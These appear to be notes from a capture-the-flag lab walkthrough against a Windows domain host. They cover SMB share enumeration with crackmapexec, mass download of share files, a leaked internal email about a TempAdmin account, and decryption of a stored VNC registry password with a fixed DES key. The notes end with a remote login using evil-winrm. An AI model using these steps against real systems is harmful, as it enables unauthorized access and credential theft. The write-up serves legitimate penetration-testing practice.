
```
cme smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' --shares
```

![[Pasted image 20240917012946.png]]

```
smbclient \\\\10.10.10.182\\Data -U 'r.thompson' --password 'rY4n5eva'
```

```
prompt off
recurse on
ls
mget *
```

![[Pasted image 20240917014153.png]]

```
<p>For anyone that missed yesterday�s meeting (I�m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the �Best GPO� competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p class=MsoNormal>Steve</p>

```

So the username who's password is same as admin is TempAdmin but but here is another user mentioned (i.e. Steve) will check in the userlist if we have that user or not.

```
s.smith
```


MOUNT
```
sudo mount -t cifs //10.10.10.182/Data /mnt/share -o username='r.thompson',password='rY4n5eva'
```


Let's dig the password or this user and check the remaining smb.

```
CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d
```

```
TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059
```

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

```
6bcf2a4b6e5aca0f
```

```
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

```
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

```
s.smith
```

```
sT333ve2
```


Let's check if he is having write access or we can a reverse shell 
```
cme smb 10.10.10.182 -u 's.smith' -p 'sT333ve2' --shares
```
![[Pasted image 20240917073535.png]]


```
evil-winrm -u 's.smith' -p 'sT333ve2' -i 10.10.10.182
```

```
0c69f28aea835c5aa2442a946ba64a8c
```

```
sudo mount -t cifs //10.10.10.182/Audit$ /mnt/share -o username='s.smith',password='sT333ve2'
```

